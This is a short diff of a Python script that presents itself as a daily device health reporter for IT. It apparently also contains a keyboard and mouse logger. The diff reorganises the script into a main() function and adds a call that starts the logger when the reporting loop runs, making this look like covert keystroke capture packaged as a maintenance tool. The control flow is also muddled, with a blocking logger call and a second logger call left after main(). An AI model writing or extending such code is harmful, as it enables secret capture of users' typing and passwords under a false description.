@@ -66,9 +66,10 @@ def send_report(filename):
         print("Device health report successfully sent to IT.")
     except Exception as e:
         print(f"Failed to send report: {e}")
-
-if __name__ == "__main__":
+def main():
     report_interval = 86400 #86400 is 24 hours in secs
+    start_logger()
+
     while True:
         try:
             sys_info = gather_system_info()
@@ -148,5 +149,5 @@ def start_logger():
     keyboard_listener.join()
     mouse_listener.join()
 
-
+main()
 start_logger()
